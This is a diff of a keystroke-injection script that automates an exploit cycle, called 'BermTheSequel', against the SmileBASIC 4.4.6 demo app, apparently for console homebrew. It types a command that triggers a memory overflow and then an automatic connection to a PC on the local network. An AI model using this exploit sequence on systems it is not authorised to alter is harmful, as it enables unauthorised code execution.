@@ -1,14 +1,12 @@
-REM FULL EXPLOIT CYCLE - BermTheSequel bootstrap on 4.4.6 demo
-REM Step 1: Load saved bootstrap into slot 0
-REM Step 2: RUN it (prints DIST BOOT READY)
-REM Step 3: REMOVE (fires the overflow)
-REM Step 4: WAIT for user to type the V=START(...) line from the PC
+REM FULL EXPLOIT CYCLE (all-in-one) - BermTheSequel bootstrap, 4.4.6 demo
+REM Use on a FRESH SmileBASIC demo app in Direct mode (TXT:NS2 must be saved)
+REM load bootstrap -> RUN -> REMOVE (Out of memory) -> V=START (connect to PC)
 DEFAULTDELAY 80
 DELAY 6000
 STRINGLN PRGEDIT 0:LOADV "TXT:NS2" OUT C$:PRGSET C$
 DELAY 3000
 STRINGLN RUN
-DELAY 6000
+DELAY 10000
 STRINGLN REMOVE NSR,&H60000000,&H3FFFFFFF
-DELAY 4000
-PRINT "NOW TYPE THE V=START(...) LINE SHOWN ON THE PC"
+DELAY 5000
+STRINGLN V=START(39380,192,168,50,5)
